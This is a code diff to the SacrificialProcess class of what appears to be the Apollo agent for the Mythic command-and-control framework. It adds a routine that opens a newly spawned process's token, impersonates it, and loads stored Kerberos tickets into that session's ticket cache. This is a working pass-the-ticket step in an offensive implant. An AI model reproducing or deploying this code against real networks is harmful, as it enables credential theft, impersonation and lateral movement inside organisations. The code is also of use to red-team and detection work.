@@ -1,7 +1,6 @@
 ﻿//#define SERVER2012_COMPATIBLE
 
 using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.Core;
 using ApolloInterop.Classes.Events;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.ApolloStructs;
@@ -10,12 +9,13 @@ using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.IO;
-using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
-using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using ApolloInterop.Features.WindowsTypesAndAPIs;
+using ApolloInterop.Structs;
+using ApolloInterop.Structs.MythicStructs;
 using ApolloInterop.Utils;
 using static ApolloInterop.Enums.Win32;
 using static ApolloInterop.Structs.Win32;
@@ -25,6 +25,7 @@ namespace Process
 {
     public class SacrificialProcess : AI.Process
     {
+        private static bool SpawnedUnderNewLuid = false;
         [Flags]
         public enum LogonFlags
         {
@@ -37,7 +38,7 @@ namespace Process
         private const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
 
         private IntPtr _hParentProc = IntPtr.Zero;
-        private ProcessInformation _processInfo = new ProcessInformation();
+        private Win32.ProcessInformation _processInfo = new Win32.ProcessInformation();
         private StartupInfo _startupInfo = new StartupInfo();
         private StartupInfoEx _startupInfoEx = new StartupInfoEx();
         private CreateProcessFlags _processFlags = CreateProcessFlags.CREATE_NEW_CONSOLE | CreateProcessFlags.CREATE_UNICODE_ENVIRONMENT;
@@ -76,7 +77,7 @@ namespace Process
             IntPtr lpEnvironment,
             String lpCurrentDirectory,
             ref StartupInfoEx lpStartupInfo,
-            out ProcessInformation lpProcessInformation
+            out Win32.ProcessInformation lpProcessInformation
         );
         private delegate bool CreateProcessWithLogonW(
             [MarshalAs(UnmanagedType.LPWStr)]String lpUsername,
@@ -89,7 +90,7 @@ namespace Process
             IntPtr lpEnvironment,
             [MarshalAs(UnmanagedType.LPWStr)]String lpCurrentDirectory,
             [In] ref StartupInfoEx lpStartupInfo,
-            out ProcessInformation lpProcessInformation);
+            out Win32.ProcessInformation lpProcessInformation);
         private delegate bool CreateProcessWithTokenW(
             IntPtr hToken,
             LogonFlags dwLogonFlags,
@@ -99,7 +100,7 @@ namespace Process
             IntPtr lpEnvironment,
             [MarshalAs(UnmanagedType.LPWStr)]String lpCurrentDirectory,
             [In] ref StartupInfoEx lpStartupInfo,
-            out ProcessInformation lpProcessInformation);
+            out Win32.ProcessInformation lpProcessInformation);
         #endregion
         #region KERNEL32
 #if SERVER2012_COMPATIBLE
@@ -154,7 +155,7 @@ namespace Process
             IntPtr lpEnvironment,
             string lpCurrentDirectory,
             ref StartupInfoEx lpStartupInfo,
-            out ProcessInformation lpProcessInformation);
+            out Win32.ProcessInformation lpProcessInformation);
         private delegate UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilli);
         private delegate bool GetExitCodeProcess(
             IntPtr hProcess,
@@ -189,6 +190,8 @@ namespace Process
         private LogonUser _pLogonUser;
         private CreateProcessWithLogonW _pCreateProcessWithLogonW;
         private CreateProcessWithTokenW _pCreateProcessWithTokenW;
+        public Advapi32APIs.ImpersonateLoggedOnUser ImpersonateLoggedOnUserDelegate { get; private set; }
+        public Advapi32APIs.OpenProcessToken OpenProcessTokenDelegate { get; private set; }
         #endregion
 
         public SacrificialProcess(
@@ -203,6 +206,7 @@ namespace Process
             _pCreateProcessAsUser = _agent.GetApi().GetLibraryFunction<CreateProcessAsUser>(Library.ADVAPI32, "CreateProcessAsUserA");
             _pCreateProcessWithLogonW = _agent.GetApi().GetLibraryFunction<CreateProcessWithLogonW>(Library.ADVAPI32, "CreateProcessWithLogonW");
             _pCreateProcessWithTokenW = _agent.GetApi().GetLibraryFunction<CreateProcessWithTokenW>(Library.ADVAPI32, "CreateProcessWithTokenW");
+            ImpersonateLoggedOnUserDelegate = _agent.GetApi().GetLibraryFunction<Advapi32APIs.ImpersonateLoggedOnUser>(Library.ADVAPI32, "ImpersonateLoggedOnUser");
 
             #if SERVER2012_COMPATIBLE
             _pGetModuleHandleA = _agent.GetApi().GetLibraryFunction<GetModuleHandleA>(Library.KERNEL32, "GetModuleHandleA");
@@ -237,6 +241,7 @@ namespace Process
             _pCreateProcessA = _agent.GetApi().GetLibraryFunction<CreateProcessA>(Library.KERNEL32, "CreateProcessA");
             _pCreatePipe = _agent.GetApi().GetLibraryFunction<CreatePipe>(Library.KERNEL32, "CreatePipe");
             _pOpenProcess = _agent.GetApi().GetLibraryFunction<OpenProcess>(Library.KERNEL32, "OpenProcess");
+            OpenProcessTokenDelegate = _agent.GetApi().GetLibraryFunction<Advapi32APIs.OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
             _pDuplicateHandle = _agent.GetApi().GetLibraryFunction<DuplicateHandle>(Library.KERNEL32, "DuplicateHandle");
             _pWaitForSingleObject = _agent.GetApi().GetLibraryFunction<WaitForSingleObject>(Library.KERNEL32, "WaitForSingleObject");
             _pGetExitCodeProcess = _agent.GetApi().GetLibraryFunction<GetExitCodeProcess>(Library.KERNEL32, "GetExitCodeProcess");
@@ -509,9 +514,8 @@ namespace Process
         public override bool Start()
         {
             bool bRet = false;
-            
             if (_agent.GetIdentityManager().IsOriginalIdentity())
-            {
+            {           
                 bRet = InitializeStartupEnvironment(_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Token);
                 if (bRet)
                 {
@@ -530,7 +534,6 @@ namespace Process
             }
             else
             {
-                DebugHelp.DebugWriteLine($"Using Impersonating identity {_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Name}.");
                 return StartWithCredentials(_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Token);
             }
             if (!bRet)
@@ -721,7 +724,7 @@ namespace Process
                     DebugHelp.DebugWriteLine("Failed to create process as user. Attempting to create process with token.");
                     bRet = _pCreateProcessWithTokenW(
                         hToken,
-                        LogonFlags.LOGON_NETCREDENTIALS_ONLY, // LOGON_NET_CREDENTIALS_ONLY
+                        LogonFlags.LOGON_NETCREDENTIALS_ONLY,
                         null,
                         CommandLine,
                         _processFlags,
@@ -741,6 +744,7 @@ namespace Process
                                 cred.Username,
                                 cred.Domain,
                                 cred.Password,
+                                //LogonFlags.NONE, //Atm I am getting error 142 but using NETCREDENTIALS_ONLY gives no error
                                 LogonFlags.LOGON_NETCREDENTIALS_ONLY,
                                 null,
                                 CommandLine,
@@ -760,9 +764,51 @@ namespace Process
                     throw new Win32Exception(dwError);
                 }
 
+                
+                
+                
+
                 PostStartupInitialize();
-                if (PID != 0)
-                    WaitForExitAsync();
+                if (PID == 0)
+                {
+                    return bRet;
+                }
+                //if running an a medium int user we may want to inject stored tickets into out new process
+                if (_agent.GetIdentityManager().GetIntegrityLevel() < IntegrityLevel.HighIntegrity)
+                {
+                    DebugHelp.DebugWriteLine($"LUID prior to impersonation: {_agent.GetTicketManager().GetCurrentLuid()}");
+                    //get into the context of the newly created process prior to loading tickets
+                    IntPtr targetProcessHandle = _pOpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, (int)PID);
+                    if(targetProcessHandle == IntPtr.Zero)
+                    {
+                        DebugHelp.DebugWriteLine("Failed to open process handle");
+                    }
+                    bool OpenedTargetToken = OpenProcessTokenDelegate((APIInteropTypes.HANDLE)targetProcessHandle, TokenAccessLevels.Query | TokenAccessLevels.Duplicate, out APIInteropTypes.HANDLE targetProcessTokenHandle);
+                    if(OpenedTargetToken is false)
+                    {
+                        DebugHelp.DebugWriteLine("Failed to open process token handle");
+                        DebugHelp.DebugWriteLine("Error code: " + Marshal.GetLastWin32Error());
+                    }
+                    if(targetProcessTokenHandle.IsNull)
+                    {
+                        DebugHelp.DebugWriteLine("opened token but handle is null");
+                        DebugHelp.DebugWriteLine("Error code: " + Marshal.GetLastWin32Error());
+                    }
+                    if (ImpersonateLoggedOnUserDelegate(targetProcessTokenHandle) is false)
+                    {
+                        DebugHelp.DebugWriteLine("Failed to impersonate logged on user");
+                    }
+                    DebugHelp.DebugWriteLine($"LUID post impersonation: {_agent.GetTicketManager().GetCurrentLuid()}");
+                    //check the ticket manager and load the ticket into the process
+                    var storedTickets = _agent.GetTicketManager().GetTicketsFromTicketStore();
+                    foreach (var ticket in storedTickets)
+                    {
+                        var ticketBytes = Convert.FromBase64String(ticket.base64Ticket);
+                        _agent.GetTicketManager().LoadTicketIntoCache(ticketBytes, "");
+                    }
+                }
+                //start executing the process
+                WaitForExitAsync();
                 return bRet;
             }
         }
